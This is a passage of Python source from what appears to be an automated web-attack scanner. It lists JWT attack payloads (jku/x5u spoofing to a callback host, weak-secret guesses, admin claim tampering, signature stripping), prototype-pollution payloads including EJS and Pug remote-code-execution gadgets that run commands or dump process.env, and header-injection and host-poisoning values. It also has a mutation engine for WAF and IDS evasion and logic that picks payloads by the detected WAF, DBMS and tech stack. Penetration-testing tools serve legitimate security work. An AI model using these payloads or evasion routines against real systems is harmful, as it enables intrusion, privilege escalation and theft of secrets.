    # --- JKU/X5U spoofing ---
    Payload(
        '{"alg":"RS256","jku":"https://CALLBACK/.well-known/jwks.json"}',
        PayloadCategory.JWT,
        description="JWT jku URL spoofing",
        tags=("jku_spoof",),
    ),
    Payload(
        '{"alg":"RS256","x5u":"https://CALLBACK/x509.pem"}',
        PayloadCategory.JWT,
        description="JWT x5u URL spoofing",
        tags=("x5u_spoof",),
    ),
    Payload(
        '{"alg":"RS256","jku":"https://target.com@CALLBACK/jwks.json"}',
        PayloadCategory.JWT,
        description="JWT jku URL confusion",
        tags=("jku_spoof",),
    ),
    # --- Weak secrets ---
    Payload("secret", PayloadCategory.JWT, description="JWT weak secret: secret",
            tags=("brute",)),
    Payload("password", PayloadCategory.JWT, description="JWT weak secret: password",
            tags=("brute",)),
    Payload("123456", PayloadCategory.JWT, description="JWT weak secret: 123456",
            tags=("brute",)),
    Payload("", PayloadCategory.JWT, description="JWT empty secret",
            tags=("brute",)),
    Payload("key", PayloadCategory.JWT, description="JWT weak secret: key",
            tags=("brute",)),
    Payload("your-256-bit-secret", PayloadCategory.JWT,
            description="JWT default jwt.io secret", tags=("brute",)),
    Payload("jwt_secret", PayloadCategory.JWT, description="JWT weak secret: jwt_secret",
            tags=("brute",)),
    Payload("changeme", PayloadCategory.JWT, description="JWT weak secret: changeme",
            tags=("brute",)),
    Payload("test", PayloadCategory.JWT, description="JWT weak secret: test",
            tags=("brute",)),
    Payload("supersecret", PayloadCategory.JWT, description="JWT weak secret: supersecret",
            tags=("brute",)),
    # --- Claim tampering ---
    Payload(
        '{"sub":"admin","role":"admin"}', PayloadCategory.JWT,
        description="JWT admin role claim",
        tags=("claim_tamper",),
    ),
    Payload(
        '{"sub":"admin","admin":true}', PayloadCategory.JWT,
        description="JWT admin flag claim",
        tags=("claim_tamper",),
    ),
    Payload(
        '{"sub":"admin","iss":"self"}', PayloadCategory.JWT,
        description="JWT issuer spoof",
        tags=("claim_tamper",),
    ),
    Payload(
        '{"exp":9999999999}', PayloadCategory.JWT,
        description="JWT far-future expiry",
        tags=("claim_tamper",),
    ),
    # --- Signature stripping ---
    Payload(
        "header.payload.", PayloadCategory.JWT,
        description="JWT empty signature",
        tags=("sig_strip",),
    ),
]


_PP_PAYLOADS: list[Payload] = [
    # --- JSON body prototype pollution ---
    Payload(
        '{"__proto__":{"admin":true}}',
        PayloadCategory.PROTOTYPE_POLLUTION, context=InjectionContext.JSON_VALUE,
        description="PP __proto__ admin flag",
    ),
    Payload(
        '{"__proto__":{"isAdmin":true}}',
        PayloadCategory.PROTOTYPE_POLLUTION, context=InjectionContext.JSON_VALUE,
        description="PP __proto__ isAdmin",
    ),
    Payload(
        '{"__proto__":{"role":"admin"}}',
        PayloadCategory.PROTOTYPE_POLLUTION, context=InjectionContext.JSON_VALUE,
        description="PP __proto__ role escalation",
    ),
    Payload(
        '{"constructor":{"prototype":{"admin":true}}}',
        PayloadCategory.PROTOTYPE_POLLUTION, context=InjectionContext.JSON_VALUE,
        description="PP constructor.prototype admin",
    ),
    Payload(
        '{"__proto__":{"polluted":"basilisk_pp_test"}}',
        PayloadCategory.PROTOTYPE_POLLUTION, context=InjectionContext.JSON_VALUE,
        description="PP canary detection",
    ),
    Payload(
        '{"__proto__":{"status":200}}',
        PayloadCategory.PROTOTYPE_POLLUTION, context=InjectionContext.JSON_VALUE,
        description="PP status override",
    ),
    Payload(
        '{"__proto__":{"type":"text/html"}}',
        PayloadCategory.PROTOTYPE_POLLUTION, context=InjectionContext.JSON_VALUE,
        description="PP content-type override",
    ),
    # --- Query string PP ---
    Payload(
        "__proto__[admin]=true",
        PayloadCategory.PROTOTYPE_POLLUTION, context=InjectionContext.QUERY_PARAM,
        description="PP query string admin",
    ),
    Payload(
        "__proto__[polluted]=basilisk_pp_test",
        PayloadCategory.PROTOTYPE_POLLUTION, context=InjectionContext.QUERY_PARAM,
        description="PP query string canary",
    ),
    Payload(
        "constructor[prototype][admin]=true",
        PayloadCategory.PROTOTYPE_POLLUTION, context=InjectionContext.QUERY_PARAM,
        description="PP query constructor.prototype",
    ),
    Payload(
        "__proto__.admin=true",
        PayloadCategory.PROTOTYPE_POLLUTION, context=InjectionContext.QUERY_PARAM,
        description="PP dot notation admin",
    ),
    # --- Nested PP ---
    Payload(
        '{"__proto__":{"__proto__":{"deep":true}}}',
        PayloadCategory.PROTOTYPE_POLLUTION, context=InjectionContext.JSON_VALUE,
        description="PP nested chain",
    ),
    Payload(
        '{"constructor":{"prototype":{"constructor":{"prototype":{"deep":true}}}}}',
        PayloadCategory.PROTOTYPE_POLLUTION, context=InjectionContext.JSON_VALUE,
        description="PP deep constructor chain",
    ),
    # --- Server-side PP (Express/Fastify) ---
    Payload(
        '{"__proto__":{"outputFunctionName":"x]});process.mainModule.'
        'require(\'child_process\').execSync(\'id\')//"}',
        PayloadCategory.PROTOTYPE_POLLUTION, context=InjectionContext.JSON_VALUE,
        waf_level=2, description="PP Express EJS RCE gadget",
    ),
    Payload(
        '{"__proto__":{"client":true,"escapeFunction":"1;return process.'
        'env;//"}}',
        PayloadCategory.PROTOTYPE_POLLUTION, context=InjectionContext.JSON_VALUE,
        waf_level=2, description="PP Pug RCE gadget",
    ),
    # --- DOM PP (for browser detection) ---
    Payload(
        '{"__proto__":{"innerHTML":"<img src=x onerror=alert(1)>"}}',
        PayloadCategory.PROTOTYPE_POLLUTION, context=InjectionContext.JSON_VALUE,
        description="PP DOM XSS gadget",
    ),
    Payload(
        '{"__proto__":{"src":"data:,alert(1)//"}}',
        PayloadCategory.PROTOTYPE_POLLUTION, context=InjectionContext.JSON_VALUE,
        description="PP script src gadget",
    ),
    # --- Lodash/jQuery merge PP ---
    Payload(
        '{"__proto__":{"shell":"/proc/self/exe","NODE_OPTIONS":"--require /proc/self/cmdline"}}',
        PayloadCategory.PROTOTYPE_POLLUTION, context=InjectionContext.JSON_VALUE,
        waf_level=2, description="PP Node.js env gadget",
    ),
]


# Master registry
_PAYLOAD_DB: dict[PayloadCategory, list[Payload]] = {
    PayloadCategory.SQLI: _SQLI_PAYLOADS,
    PayloadCategory.XSS: _XSS_PAYLOADS,
    PayloadCategory.SSTI: _SSTI_PAYLOADS,
    PayloadCategory.LFI: _LFI_PAYLOADS,
    PayloadCategory.RCE: _RCE_PAYLOADS,
    PayloadCategory.SSRF: _SSRF_PAYLOADS,
    PayloadCategory.XXE: _XXE_PAYLOADS,
    PayloadCategory.CRLF: _CRLF_PAYLOADS,
    PayloadCategory.NOSQLI: _NOSQLI_PAYLOADS,
    PayloadCategory.OPEN_REDIRECT: _REDIRECT_PAYLOADS,
    PayloadCategory.JWT: _JWT_PAYLOADS,
    PayloadCategory.PROTOTYPE_POLLUTION: _PP_PAYLOADS,
    PayloadCategory.HEADER_INJECTION: [
        Payload("X-Forwarded-For: 127.0.0.1", PayloadCategory.HEADER_INJECTION,
                context=InjectionContext.HEADER_VALUE, description="XFF localhost"),
        Payload("X-Forwarded-Host: evil.com", PayloadCategory.HEADER_INJECTION,
                context=InjectionContext.HEADER_VALUE, description="XFH poison"),
        Payload("X-Original-URL: /admin", PayloadCategory.HEADER_INJECTION,
                context=InjectionContext.HEADER_VALUE, description="X-Original-URL bypass"),
        Payload("X-Rewrite-URL: /admin", PayloadCategory.HEADER_INJECTION,
                context=InjectionContext.HEADER_VALUE, description="X-Rewrite-URL bypass"),
        Payload("X-Custom-IP-Authorization: 127.0.0.1", PayloadCategory.HEADER_INJECTION,
                context=InjectionContext.HEADER_VALUE, description="IP auth bypass"),
        Payload("X-Forwarded-For: 127.0.0.1\r\nX-Forwarded-Host: evil.com",
                PayloadCategory.HEADER_INJECTION, context=InjectionContext.HEADER_VALUE,
                description="Multi-header injection"),
        Payload("Host: evil.com", PayloadCategory.HEADER_INJECTION,
                context=InjectionContext.HEADER_VALUE, description="Host header override"),
        Payload("X-Forwarded-Scheme: http", PayloadCategory.HEADER_INJECTION,
                context=InjectionContext.HEADER_VALUE, description="Scheme downgrade"),
        Payload("X-Forwarded-Proto: http", PayloadCategory.HEADER_INJECTION,
                context=InjectionContext.HEADER_VALUE, description="Proto downgrade"),
        Payload("X-Real-IP: 127.0.0.1", PayloadCategory.HEADER_INJECTION,
                context=InjectionContext.HEADER_VALUE, description="X-Real-IP bypass"),
        Payload("True-Client-IP: 127.0.0.1", PayloadCategory.HEADER_INJECTION,
                context=InjectionContext.HEADER_VALUE, description="True-Client-IP bypass"),
        Payload("Client-IP: 127.0.0.1", PayloadCategory.HEADER_INJECTION,
                context=InjectionContext.HEADER_VALUE, description="Client-IP bypass"),
    ],
}


# ---------------------------------------------------------------------------
# Mutation engine
# ---------------------------------------------------------------------------

class MutationEngine:
    """Generates payload variants via encoding and obfuscation."""

    @staticmethod
    def case_swap(payload: str) -> list[str]:
        """Generate case-swapped variants of SQL/HTML keywords."""
        keywords = [
            "SELECT", "UNION", "OR", "AND", "FROM", "WHERE", "ORDER",
            "GROUP", "INSERT", "UPDATE", "DELETE", "DROP", "EXEC",
            "SLEEP", "BENCHMARK", "WAITFOR",
            "script", "onerror", "onload", "alert", "javascript",
            "onclick", "onfocus", "onmouseover", "svg", "img", "iframe",
        ]
        variants = []
        upper = payload.upper()
        for kw in keywords:
            kw_upper = kw.upper()
            if kw_upper in upper:
                idx = upper.index(kw_upper)
                orig = payload[idx:idx + len(kw)]
                swapped = "".join(
                    c.upper() if i % 2 == 0 else c.lower()
                    for i, c in enumerate(orig)
                )
                if swapped != orig:
                    variants.append(payload[:idx] + swapped + payload[idx + len(kw):])
        return variants

    @staticmethod
    def comment_split(payload: str) -> list[str]:
        """Insert SQL comments within keywords."""
        keywords = ["OR", "AND", "SELECT", "UNION", "FROM", "WHERE"]
        variants = []
        upper = payload.upper()
        for kw in keywords:
            padded = f" {kw} "
            if padded in upper:
                idx = upper.index(padded)
                commented = f" {kw[0]}/**/{kw[1:]} "
                variants.append(payload[:idx] + commented + payload[idx + len(padded):])
        return variants

    @staticmethod
    def url_encode(payload: str, double: bool = False) -> str:
        """URL-encode special characters, optionally double-encode."""
        encoded = quote(payload, safe="")
        if double:
            encoded = quote(encoded, safe="")
        return encoded

    @staticmethod
    def null_byte_insert(payload: str) -> list[str]:
        """Insert null bytes at strategic positions."""
        variants = []
        if "'" in payload:
            variants.append(payload.replace("'", "%00'", 1))
        if " " in payload:
            variants.append(payload.replace(" ", "%00 ", 1))
        return variants

    @staticmethod
    def unicode_normalize(payload: str) -> list[str]:
        """Generate Unicode normalization bypass variants."""
        replacements = {
            "'": ["\u02bc", "\u2018", "\uff07"],
            '"': ["\u201c", "\uff02"],
            "<": ["\uff1c", "\u00ab"],
            ">": ["\uff1e", "\u00bb"],
            "/": ["\u2215", "\uff0f"],
        }
        variants = []
        for char, alts in replacements.items():
            if char in payload:
                for alt in alts:
                    variants.append(payload.replace(char, alt, 1))
        return variants

    @staticmethod
    def whitespace_variants(payload: str) -> list[str]:
        """Replace spaces with alternative whitespace."""
        alternatives = ["\t", "\n", "\r", "%09", "%0a", "%0d", "%0b", "%0c", "+", "/**/"]
        variants = []
        if " " in payload:
            for alt in alternatives:
                variants.append(payload.replace(" ", alt))
        return variants

    @staticmethod
    def space2comment(payload: str) -> str:
        """Replace spaces with SQL inline comments (sqlmap tamper: space2comment)."""
        return payload.replace(" ", "/**/")

    @staticmethod
    def between_bypass(payload: str) -> str:
        """Replace '>' with 'NOT BETWEEN 0 AND' (sqlmap tamper: between)."""
        import re
        result = payload
        result = re.sub(r"(\d+)\s*>\s*(\d+)", r"\1 NOT BETWEEN 0 AND \2", result)
        result = re.sub(r"(\d+)\s*=\s*(\d+)", r"\1 BETWEEN \2 AND \2", result)
        return result

    @staticmethod
    def charencode(payload: str) -> str:
        """Encode payload chars as CHAR() calls (sqlmap tamper: charencode)."""
        return "CONCAT(" + ",".join(f"CHAR({ord(c)})" for c in payload) + ")"

    @staticmethod
    def concat_bypass(payload: str) -> str:
        """Break string literals using CONCAT (sqlmap tamper: unmagicquotes)."""
        import re
        def _replace(m: re.Match) -> str:
            s = m.group(1)
            if len(s) < 2:
                return m.group(0)
            mid = len(s) // 2
            return f"CONCAT('{s[:mid]}','{s[mid:]}')"
        return re.sub(r"'([^']{2,})'", _replace, payload)

    @staticmethod
    def hex_encode(payload: str) -> str:
        """Encode string payload as hex (e.g. 0x...) for MySQL."""
        return "0x" + payload.encode().hex()

    @staticmethod
    def space2dash(payload: str) -> str:
        """Replace spaces with -- followed by newline (sqlmap tamper: space2dash)."""
        return payload.replace(" ", " --\n")

    @staticmethod
    def space2hash(payload: str) -> str:
        """Replace spaces with # followed by newline (MySQL) (sqlmap tamper: space2hash)."""
        return payload.replace(" ", " #\n")

    @staticmethod
    def percentage_encode(payload: str) -> str:
        """Insert % between characters (IDS evasion)."""
        return "%".join(payload)

    @classmethod
    def mutate(cls, payload: str, max_variants: int = 10) -> list[str]:
        """Generate up to max_variants mutations of a payload."""
        all_variants: list[str] = []
        all_variants.extend(cls.case_swap(payload))
        all_variants.extend(cls.comment_split(payload))
        all_variants.extend(cls.null_byte_insert(payload))
        all_variants.extend(cls.whitespace_variants(payload)[:3])
        all_variants.append(cls.url_encode(payload))
        all_variants.append(cls.url_encode(payload, double=True))
        all_variants.extend(cls.unicode_normalize(payload)[:2])
        # sqlmap-style tampers
        if " " in payload:
            all_variants.append(cls.space2comment(payload))
            all_variants.append(cls.space2dash(payload))
        if "'" in payload:
            concat = cls.concat_bypass(payload)
            if concat != payload:
                all_variants.append(concat)

        # Deduplicate and limit
        seen: set[str] = {payload}
        unique: list[str] = []
        for v in all_variants:
            if v not in seen:
                seen.add(v)
                unique.append(v)
        return unique[:max_variants]


# ---------------------------------------------------------------------------
# Main engine
# ---------------------------------------------------------------------------

class PayloadEngine:
    """Adaptive payload selection and generation.

    Usage::

        engine = PayloadEngine()
        for p in engine.get(PayloadCategory.SQLI, dbms=DbmsType.MYSQL, max_waf=1):
            print(p.value)

        # With mutations
        for p in engine.get_with_mutations(PayloadCategory.XSS, max_variants=3):
            print(p.value, p.variants)
    """

    def __init__(self, custom_payloads: dict[PayloadCategory, list[Payload]] | None = None):
        self._db: dict[PayloadCategory, list[Payload]] = {}
        # Copy defaults
        for cat, payloads in _PAYLOAD_DB.items():
            self._db[cat] = list(payloads)
        # Add custom
        if custom_payloads:
            for cat, payloads in custom_payloads.items():
                if cat in self._db:
                    self._db[cat].extend(payloads)
                else:
                    self._db[cat] = list(payloads)

    @property
    def categories(self) -> list[PayloadCategory]:
        """Available payload categories."""
        return list(self._db.keys())

    def count(self, category: PayloadCategory | None = None) -> int:
        """Count payloads, optionally by category."""
        if category:
            return len(self._db.get(category, []))
        return sum(len(v) for v in self._db.values())

    def get(
        self,
        category: PayloadCategory,
        *,
        dbms: DbmsType | None = None,
        context: InjectionContext | None = None,
        max_waf: int = 3,
        blind_only: bool = False,
        limit: int = 0,
    ) -> list[Payload]:
        """Get payloads filtered by criteria.

        Args:
            category: Payload category (sqli, xss, etc.)
            dbms: Filter to specific DBMS (None = all)
            context: Filter to injection context (None = all)
            max_waf: Maximum WAF evasion level to include
            blind_only: Only return blind payloads
            limit: Max payloads to return (0 = all)
        """
        source = self._db.get(category, [])
        result: list[Payload] = []

        for p in source:
            if p.waf_level > max_waf:
                continue
            if dbms and p.dbms != DbmsType.GENERIC and p.dbms != dbms:
                continue
            if context and p.context != context:
                continue
            if blind_only and not p.blind:
                continue
            result.append(p)

        if limit > 0:
            result = result[:limit]
        return result

    def get_for_waf(
        self,
        category: PayloadCategory,
        waf_name: str,
        *,
        dbms: DbmsType | None = None,
    ) -> list[Payload]:
        """Get payloads optimized for a specific WAF.

        Returns WAF-evasion payloads first, then standard ones.
        """
        all_payloads = self.get(category, dbms=dbms, max_waf=3)
        # Sort: higher WAF level first for WAF-protected targets
        return sorted(all_payloads, key=lambda p: -p.waf_level)

    def get_with_mutations(
        self,
        category: PayloadCategory,
        *,
        dbms: DbmsType | None = None,
        max_variants: int = 5,
        limit: int = 0,
    ) -> list[tuple[Payload, list[str]]]:
        """Get payloads with mutation variants.

        Returns list of (payload, [variant1, variant2, ...]).
        """
        payloads = self.get(category, dbms=dbms, limit=limit)
        return [
            (p, MutationEngine.mutate(p.value, max_variants=max_variants))
            for p in payloads
        ]

    def smart_select(
        self,
        category: PayloadCategory,
        *,
        detected_waf: str | None = None,
        detected_dbms: DbmsType | None = None,
        detected_tech: list[str] | None = None,
        limit: int = 20,
    ) -> list[Payload]:
        """Context-aware payload selection based on discovered intelligence.

        Uses pipeline data (WAF type, DBMS, tech stack) to pick the most
        effective payloads. Falls back to generic if no context available.
        """
        max_waf = 0
        if detected_waf:
            max_waf = 3  # enable all evasion levels

        payloads = self.get(
            category,
            dbms=detected_dbms,
            max_waf=max_waf,
        )

        if detected_waf:
            # Prioritize WAF-evasion payloads
            payloads.sort(key=lambda p: -p.waf_level)

        if detected_dbms and category == PayloadCategory.SQLI:
            # Prioritize DBMS-specific payloads
            def dbms_score(p: Payload) -> int:
                if p.dbms == detected_dbms:
                    return 2
                if p.dbms == DbmsType.GENERIC:
                    return 1
                return 0
            payloads.sort(key=dbms_score, reverse=True)

        if detected_tech and category == PayloadCategory.SSTI:
            # Prioritize template engine-specific payloads
            tech_lower = [t.lower() for t in detected_tech]
            if any(t in tech_lower for t in ("jinja2", "flask", "django", "python")):
                payloads.sort(key=lambda p: "jinja" in p.description.lower(), reverse=True)
            elif any(t in tech_lower for t in ("java", "spring", "thymeleaf")):
                payloads.sort(key=lambda p: "spring" in p.description.lower(), reverse=True)
            elif any(t in tech_lower for t in ("twig", "symfony", "php")):
                payloads.sort(key=lambda p: "twig" in p.description.lower(), reverse=True)
            elif any(t in tech_lower for t in ("express", "node", "ejs", "pug", "handlebars")):
                payloads.sort(
                    key=lambda p: any(
                        e in p.description.lower() for e in ("ejs", "pug", "handlebars", "node")
                    ), reverse=True,
                )

        if category == PayloadCategory.JWT:
            # Prioritize based on common JWT attack surface
            def jwt_score(p: Payload) -> int:
                if "alg:none" in p.description.lower():
                    return 5  # Most likely to succeed
                if "algorithm_confusion" in p.tags:
                    return 4
                if "kid_injection" in p.tags:
                    return 3
                if "brute" in p.tags:
                    return 2
                return 1
            payloads.sort(key=jwt_score, reverse=True)

        if detected_tech and category == PayloadCategory.PROTOTYPE_POLLUTION:
            tech_lower = [t.lower() for t in detected_tech]
            if any(t in tech_lower for t in ("express", "node", "fastify")):
                payloads.sort(
                    key=lambda p: "server" in p.description.lower()
                    or "express" in p.description.lower(),
                    reverse=True,
                )

        return payloads[:limit]

    def add(self, category: PayloadCategory, payloads: list[Payload]) -> None:
        """Add custom payloads to a category."""
        if category not in self._db:
            self._db[category] = []
        self._db[category].extend(payloads)
